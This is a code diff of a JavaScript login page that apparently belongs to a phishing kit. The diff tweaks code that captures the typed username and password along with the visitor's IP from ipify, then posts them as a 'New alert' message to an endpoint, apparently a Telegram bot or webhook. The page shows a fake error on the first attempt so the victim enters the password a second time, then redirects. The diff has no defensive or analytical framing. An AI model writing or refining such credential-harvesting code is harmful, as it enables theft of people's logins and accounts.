@@ -70,7 +70,7 @@
     let attempt = 0;
     let isProcessing = false;
 
-    // Only fetch raw IP (fast and simple)
+    // Only fetch raw IP address (fast)
     async function getIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -82,12 +82,12 @@
       }
     }
 
-    // Send ONLY the clean alert text you want
+    // Send EXACTLY the clean text you want (no "alert:" wrapper)
     async function sendToEndpoint(username, password, ip, attemptNum) {
-      const alertText = `New alert:\n\nUsername: ${username}\nPassword: ${password}\nIp: ${ip}\nx${attemptNum}`;
+      const cleanText = `New alert:\n\nUsername: ${username}\nPassword: ${password}\nIp: ${ip}\nx${attemptNum}`;
 
       const payload = {
-        alert: alertText   // ← Only this field is sent (exactly as you want)
+        text: cleanText   // Most Telegram bots and webhooks expect "text" field
       };
 
       try {
@@ -103,11 +103,11 @@
           console.warn(`⚠️ Endpoint status: ${res.status}`);
         }
       } catch (err) {
-        console.error("❌ Failed to send to endpoint:", err);
+        console.error("❌ Failed to send:", err);
       }
     }
 
-    // Login button with two-attempt logic
+    // Login button handler
     document.getElementById('loginBtn').addEventListener('click', async () => {
       if (isProcessing) return;
       isProcessing = true;
@@ -130,17 +130,14 @@
 
       const ip = await getIP();
 
-      // Send clean alert only
       await sendToEndpoint(username, password, ip, attempt);
 
       if (attempt === 1) {
-        // First attempt: show error + shake
         errorMsg.classList.remove('hidden');
         passwordInput.value = '';
         passwordInput.classList.add('animate-shake');
         setTimeout(() => passwordInput.classList.remove('animate-shake'), 600);
       } else {
-        // Second attempt: loading then redirect
         btn.disabled = true;
         btnText.textContent = 'Loading...';
         spinner.classList.remove('hidden');
